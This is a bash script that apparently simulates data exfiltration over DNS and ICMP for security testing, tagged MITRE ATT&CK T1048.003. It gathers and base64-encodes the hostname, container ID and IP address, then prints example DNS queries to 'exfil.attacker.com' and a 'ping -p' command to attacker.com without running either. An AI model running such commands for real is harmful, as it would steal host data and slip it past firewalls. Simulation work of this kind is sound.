#!/bin/bash
# Attack: Exfiltration via Alternative Protocol
# MITRE ATT&CK: Exfiltration - T1048.003
# Severity: HIGH
# Description: Demonstrates data exfiltration using DNS tunneling

set -e
echo "[+] Starting: Exfiltration via Alternative Protocol"
echo "[+] MITRE ATT&CK: T1048.003 - Exfiltration Over Alternative Protocol"
echo "[+] Severity: HIGH"
echo ""

echo "[*] Step 1: Collecting sensitive data..."
HOSTNAME=$(hostname)
CONTAINER_ID=$(cat /proc/self/cgroup | head -1 | cut -d/ -f3 | cut -c1-12)
IP_ADDR=$(hostname -i 2>/dev/null || echo "unknown")

echo "[*] Data collected:"
echo "    - Hostname: $HOSTNAME"
echo "    - Container ID: $CONTAINER_ID"
echo "    - IP Address: $IP_ADDR"

echo ""
echo "[*] Step 2: Encoding data for exfiltration..."
DATA_B64=$(echo "$HOSTNAME|$CONTAINER_ID|$IP_ADDR" | base64 | tr -d '\n')
echo "[*] Encoded: $DATA_B64"

echo ""
echo "[*] Step 3: Simulating DNS exfiltration..."
echo "[*] Would send DNS queries like:"
echo "    ${DATA_B64:0:20}.exfil.attacker.com"
echo "    ${DATA_B64:20:20}.exfil.attacker.com"

echo ""
echo "[*] Step 4: Alternative exfiltration via ICMP..."
echo "[*] Simulating ICMP tunneling (ping with data)..."
echo "[*] ping -c 1 -p $DATA_B64 attacker.com"

echo ""
echo "[✓] Exfiltration simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Use DNS queries to exfiltrate data"
echo "    - Leverage ICMP, NTP, or other protocols"
echo "    - Bypass firewall rules that only inspect HTTP/HTTPS"
echo "    - Encode data in protocol fields"
